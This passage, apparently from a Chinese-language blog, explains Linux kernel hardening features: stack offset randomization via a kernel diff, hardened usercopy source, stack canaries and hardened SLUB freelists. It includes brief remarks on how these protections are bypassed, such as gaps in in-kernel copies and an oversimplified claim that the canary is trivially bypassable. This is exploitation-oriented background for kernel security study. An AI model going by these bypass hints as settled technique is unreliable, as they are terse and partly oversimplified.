HAVE_ARCH_WITHIN_STACK_FRAMES</span><br><span class="line"> 	select HAVE_ASM_MODVERSIONS</span><br><span class="line"> 	select HAVE_CMPXCHG_DOUBLE</span><br><span class="line"><span class="comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">index 9747876980b5..086d7af570af 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="meta">@@ -26,6 +26,7 @@</span> </span><br><span class="line"> #include &lt;linux/livepatch.h&gt;</span><br><span class="line"> #include &lt;linux/syscalls.h&gt;</span><br><span class="line"> #include &lt;linux/uaccess.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/randomize_kstack.h&gt;</span></span><br><span class="line"> </span><br><span class="line"> #include &lt;asm/desc.h&gt;</span><br><span class="line"> #include &lt;asm/traps.h&gt;</span><br><span class="line"><span class="meta">@@ -189,6 +190,13 @@</span>  __visible inline void prepare_exit_to_usermode(struct pt_regs *regs)</span><br><span class="line"> 	lockdep_assert_irqs_disabled();</span><br><span class="line"> 	lockdep_sys_exit();</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	/*</span></span><br><span class="line"><span class="addition">+	 * x86_64 stack alignment means 3 bits are ignored, so keep</span></span><br><span class="line"><span class="addition">+	 * the top 5 bits. x86_32 needs only 2 bits of alignment, so</span></span><br><span class="line"><span class="addition">+	 * the top 6 bits will be used.</span></span><br><span class="line"><span class="addition">+	 */</span></span><br><span class="line"><span class="addition">+	choose_random_kstack_offset(rdtsc() &amp; 0xFF);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> 	cached_flags = READ_ONCE(ti-&gt;flags);</span><br><span class="line"> </span><br><span class="line"> 	if (unlikely(cached_flags &amp; EXIT_TO_USERMODE_LOOP_FLAGS))</span><br><span class="line"><span class="meta">@@ -283,6 +291,7 @@</span>  __visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"> 	struct thread_info *ti;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	add_random_kstack_offset();</span></span><br><span class="line"> 	enter_from_user_mode();</span><br><span class="line"> 	local_irq_enable();</span><br><span class="line"> 	ti = current_thread_info();</span><br><span class="line"><span class="meta">@@ -355,6 +364,7 @@</span>  static __always_inline void do_syscall_32_irqs_on(struct pt_regs *regs)</span><br><span class="line"> /* Handles int $0x80 */</span><br><span class="line"> __visible void do_int80_syscall_32(struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+	add_random_kstack_offset();</span></span><br><span class="line"> 	enter_from_user_mode();</span><br><span class="line"> 	local_irq_enable();</span><br><span class="line"> 	do_syscall_32_irqs_on(regs);</span><br><span class="line"><span class="meta">@@ -378,8 +388,8 @@</span>  __visible long do_fast_syscall_32(struct pt_regs *regs)</span><br><span class="line"> 	 */</span><br><span class="line"> 	regs-&gt;ip = landing_pad;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	add_random_kstack_offset();</span></span><br><span class="line"> 	enter_from_user_mode();</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"> 	local_irq_enable();</span><br><span class="line"> </span><br><span class="line"> 	/* Fetch EBP from where the vDSO stashed it. */</span><br></pre></td></tr></table></figure></div>

<h2 id="数据相关"><a href="#数据相关" class="headerlink" title="数据相关"></a>数据相关</h2><h3 id="CONFIG-HARDENED-USERCOPY"><a href="#CONFIG-HARDENED-USERCOPY" class="headerlink" title="CONFIG_HARDENED_USERCOPY"></a>CONFIG_HARDENED_USERCOPY</h3><p>hardened usercopy 是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界：</p>
<p>读取的数据长度是否超出源 object 范围<br>写入的数据长度是否超出目的 object 范围<br>不过这种保护 不适用于内核空间内的数据拷贝 ，这也是目前主流的绕过手段</p>
<p>这一保护被用于在使用 <code>copy_to_user()</code> 与 <code>copy_from_user()</code> 等数据交换 API 时用 <code>__check_object_size</code> 检查是否越界。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Rejects incorrectly sized objects and objects that are to be copied</span></span><br><span class="line"><span class="comment"> * to/from userspace but do not fall entirely within the containing slab</span></span><br><span class="line"><span class="comment"> * cache&#x27;s usercopy region.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns NULL if check passes, otherwise const char * to name of cache</span></span><br><span class="line"><span class="comment"> * to indicate an error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_heap_object(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="keyword">struct</span> page *page,</span><br><span class="line">			 <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">	<span class="type">size_t</span> object_size;</span><br><span class="line"></span><br><span class="line">	ptr = kasan_reset_tag(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find object and usable object size. */</span></span><br><span class="line">	s = page-&gt;slab_cache;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Reject impossible pointers. */</span></span><br><span class="line">	<span class="keyword">if</span> (ptr &lt; page_address(page))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;SLUB object not in SLUB page?!&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">			       to_user, <span class="number">0</span>, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find offset within object. */</span></span><br><span class="line">	offset = (ptr - page_address(page)) % s-&gt;size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust for redzone and reject if within the redzone. */</span></span><br><span class="line">	<span class="keyword">if</span> (kmem_cache_debug(s) &amp;&amp; s-&gt;flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (offset &lt; s-&gt;red_left_pad)</span><br><span class="line">			usercopy_abort(<span class="string">&quot;SLUB object in left red zone&quot;</span>,</span><br><span class="line">				       s-&gt;name, to_user, offset, n);</span><br><span class="line">		offset -= s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allow address range falling entirely within usercopy region. */</span></span><br><span class="line">	<span class="keyword">if</span> (offset &gt;= s-&gt;useroffset &amp;&amp;</span><br><span class="line">	    offset - s-&gt;useroffset &lt;= s-&gt;usersize &amp;&amp;</span><br><span class="line">	    n &lt;= s-&gt;useroffset - offset + s-&gt;usersize)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the copy is still within the allocated object, produce</span></span><br><span class="line"><span class="comment">	 * a warning instead of rejecting the copy. This is intended</span></span><br><span class="line"><span class="comment">	 * to be a temporary method to find any missing usercopy</span></span><br><span class="line"><span class="comment">	 * whitelists.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	object_size = slab_ksize(s);</span><br><span class="line">	<span class="keyword">if</span> (usercopy_fallback &amp;&amp;</span><br><span class="line">	    offset &lt;= object_size &amp;&amp; n &lt;= object_size - offset) &#123;</span><br><span class="line">		usercopy_warn(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	usercopy_abort(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_heap_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	page = virt_to_head_page(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageSlab(page)) &#123;</span><br><span class="line">		<span class="comment">/* Check slab allocator for flags and size. */</span></span><br><span class="line">		__check_heap_object(ptr, n, page, to_user);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks if a given pointer and length is contained by the current</span></span><br><span class="line"><span class="comment"> * stack frame (if possible).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:</span></span><br><span class="line"><span class="comment"> *	NOT_STACK: not at all on the stack</span></span><br><span class="line"><span class="comment"> *	GOOD_FRAME: fully within a valid stack frame</span></span><br><span class="line"><span class="comment"> *	GOOD_STACK: fully on the stack (when can&#x27;t do frame-checking)</span></span><br><span class="line"><span class="comment"> *	BAD_STACK: error condition (invalid stack position or bad stack frame)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">int</span> <span class="title function_">check_stack_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *obj, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> <span class="built_in">stack</span> = task_stack_page(current);</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> stackend = <span class="built_in">stack</span> + THREAD_SIZE;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Object is not on the stack at all. */</span></span><br><span class="line">	<span class="keyword">if</span> (obj + len &lt;= <span class="built_in">stack</span> || stackend &lt;= obj)</span><br><span class="line">		<span class="keyword">return</span> NOT_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reject: object partially overlaps the stack (passing the</span></span><br><span class="line"><span class="comment">	 * the check above means at least one end is within the stack,</span></span><br><span class="line"><span class="comment">	 * so if this check fails, the other end is outside the stack).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (obj &lt; <span class="built_in">stack</span> || stackend &lt; obj + len)</span><br><span class="line">		<span class="keyword">return</span> BAD_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check if object is safely within a valid frame. */</span></span><br><span class="line">	ret = arch_within_stack_frames(<span class="built_in">stack</span>, stackend, obj, len);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> GOOD_STACK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is this address range in the kernel text area? */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_kernel_text_object</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> ptr,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow = (<span class="type">unsigned</span> <span class="type">long</span>)_stext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> texthigh = (<span class="type">unsigned</span> <span class="type">long</span>)_etext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow_linear, texthigh_linear;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow, texthigh))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;kernel text&quot;</span>, <span class="literal">NULL</span>, to_user, ptr - textlow, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Some architectures have virtual memory mappings with a secondary</span></span><br><span class="line"><span class="comment">	 * mapping of the kernel text, i.e. there is more than one virtual</span></span><br><span class="line"><span class="comment">	 * kernel address that points to the kernel image. It is usually</span></span><br><span class="line"><span class="comment">	 * when there is a separate linear physical memory mapping, in that</span></span><br><span class="line"><span class="comment">	 * __pa() is not just the reverse of __va(). This can be detected</span></span><br><span class="line"><span class="comment">	 * and checked:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	textlow_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(textlow);</span><br><span class="line">	<span class="comment">/* No different mapping: we&#x27;re done. */</span></span><br><span class="line">	<span class="keyword">if</span> (textlow_linear == textlow)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the secondary mapping... */</span></span><br><span class="line">	texthigh_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(texthigh);</span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow_linear, texthigh_linear))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;linear kernel text&quot;</span>, <span class="literal">NULL</span>, to_user,</span><br><span class="line">			       ptr - textlow_linear, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address</span><br><span class="line">    check_stack_object</span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;bypass_usercopy_checks))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Skip all tests if size is zero. */</span></span><br><span class="line">	<span class="keyword">if</span> (!n)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for invalid addresses. */</span></span><br><span class="line">	check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad stack object. */</span></span><br><span class="line">	<span class="keyword">switch</span> (check_stack_object(ptr, n)) &#123;</span><br><span class="line">	<span class="keyword">case</span> NOT_STACK:</span><br><span class="line">		<span class="comment">/* Object is not touching the current process stack. */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> GOOD_FRAME:</span><br><span class="line">	<span class="keyword">case</span> GOOD_STACK:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Object is either in the correct frame (when it</span></span><br><span class="line"><span class="comment">		 * is possible to check) or just generally on the</span></span><br><span class="line"><span class="comment">		 * process stack (when frame checking not available).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		usercopy_abort(<span class="string">&quot;process stack&quot;</span>, <span class="literal">NULL</span>, to_user, <span class="number">0</span>, n);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">	check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span><br><span class="line">					<span class="type">bool</span> to_user);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">					      <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__builtin_constant_p(n))</span><br><span class="line">		__check_object_size(ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">bool</span></span><br><span class="line"><span class="title function_">check_copy_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr, <span class="type">size_t</span> bytes, <span class="type">bool</span> is_source)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> sz = __compiletime_object_size(addr);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(sz &gt;= <span class="number">0</span> &amp;&amp; sz &lt; bytes)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!__builtin_constant_p(bytes))</span><br><span class="line">			copy_overflow(sz, bytes);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (is_source)</span><br><span class="line">			__bad_copy_from();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			__bad_copy_to();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	check_object_size(addr, bytes, is_source);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> __must_check</span><br><span class="line"><span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(check_copy_size(from, n, <span class="literal">true</span>)))</span><br><span class="line">		n = _copy_to_user(to, from, n);</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CONFIG-STACK-PROTECTOR"><a href="#CONFIG-STACK-PROTECTOR" class="headerlink" title="CONFIG_STACK PROTECTOR"></a>CONFIG_STACK PROTECTOR</h3><p>类似于用户态程序的canary，通常又被称作是 stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生 <code>kernel panic</code> 。<br><strong>开启：</strong> 在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。<br><strong>关闭：</strong> 我们需要重新编译内核，并关闭编译选项才可以关闭 Canary 保护。<br><strong>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处的值,可以直接绕过。</strong></p>
<h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2><h3 id="CONFIG-SLAB-FREELIST-HARDENED"><a href="#CONFIG-SLAB-FREELIST-HARDENED" class="headerlink" title="CONFIG_SLAB_FREELIST_HARDENED"></a>CONFIG_SLAB_FREELIST_HARDENED</h3><p><code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 编译选项开启 Hardened freelist 保护。<br>在这个配置下，<code>kmem_cache</code> 增加了一个变量 <code>random</code> 。在 <code>mm/slub.c</code> 文件， <code>kmem_cache_open</code> 的时候给 <code>random</code> 字段一个随机数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>set_freepointer</code> 函数中加了一个 <code>BUG_ON</code> 的检查，这里是检查 double free 的，当前 free  的 object 的内存地址和 freelist 指向的第一个 object 的地址不能一样，这和 glibc 类似。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着是 <code>freelist_ptr</code> ，它会返回当前 object 的下一个 free object 的地址， 加上 hardened 之后会和之前初始化的 random 值做异或。</p>
